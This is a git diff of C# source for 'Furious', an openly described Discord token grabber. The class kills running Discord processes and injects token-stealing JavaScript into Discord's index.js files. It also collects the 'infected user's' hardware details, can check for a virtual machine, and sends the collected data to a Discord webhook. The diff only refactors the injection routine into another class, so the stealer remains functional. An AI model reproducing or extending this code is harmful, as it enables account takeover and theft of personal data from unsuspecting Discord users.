@@ -1,7 +1,6 @@
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
-using System.IO;
 using System.Management;
 using System.Net;
 using System.Net.Http;
@@ -11,8 +10,11 @@ using System.Linq;
 
 namespace Furious
 {
-    public class Grabber
-    {
+	/// <summary>
+	/// Class with utilities for grabbing user information.
+	/// </summary>
+	public class Grabber
+	{
 		///This method allows the user to choose to customise the grabber, whether they want to inject the token grabbing code, get the infected user's hardware information, and choose to check for a virtual machine.
 		public static async Task QuickStart(bool injectJS = false, bool getUserHardware = false, bool checkForVM = false)
 		{
@@ -27,41 +29,12 @@ namespace Furious
 				await SendData(await GetHardware());
 		}
 
-
-		internal static async Task Write(string path, string javascriptPath)
-        	{
-			if (Directory.Exists(path))
-			{
-				string[] discord = Directory.GetDirectories(path);
-				foreach (string folderName in discord)
-				{
-					if (folderName.Contains("0."))
-					{
-						string DiscordPath = folderName + @"\modules\discord_modules\index.js";
-						await FileManagement.CleanFile(DiscordPath);
-						await FileManagement.WriteDiscord(DiscordPath, javascriptPath);
-					}
-				}
-			}
-		}
-		///This method is used to write the token grabbing JavaScript code into the Discord directory.
-		internal static async Task InjectJS()
-        	{
-			await Write(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discord", "Resources.stable.txt");
-
-			await Write(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discordptb", "Resources.ptb.txt");
-
-			await Write(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discordcanary", "Resources.canary.txt");
-
-			await Write(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discorddevelopment", "Resources.development.txt");
-		}
-
 		///Closes all processes which contain "discord" in their name before writing the JS.
 		internal static async Task CloseProcesses()
 		{
 			Process.GetProcesses().Where(p => p.ProcessName.Contains("discord")).ToList().ForEach(y => y.Kill());
 
-			await InjectJS();
+			await FileManagement.InjectJS();
         	}
 
 		///This method collects the users hardware specifications which can be sent to a webhook using the SendData method.
@@ -90,11 +63,10 @@ namespace Furious
 		}
 
 		///This method sends the data the paramater holds to a specified Discord webhook.
-		internal static async Task<HttpResponseMessage> SendData(string data)
+		internal static async Task<HttpResponseMessage> SendData(string data, HttpResponseMessage response = null)
 		{
 			string hook = "webhook-here";
 			
-			HttpResponseMessage response = null;
 			using (HttpClient httpClient = new HttpClient())
 			{
 				try
@@ -108,7 +80,7 @@ namespace Furious
 				}
 				catch (HttpRequestException ex)
 				{
-					Debug.WriteLine(ex.Message);
+					Console.WriteLine(ex.Message);
 				}
 			}
 
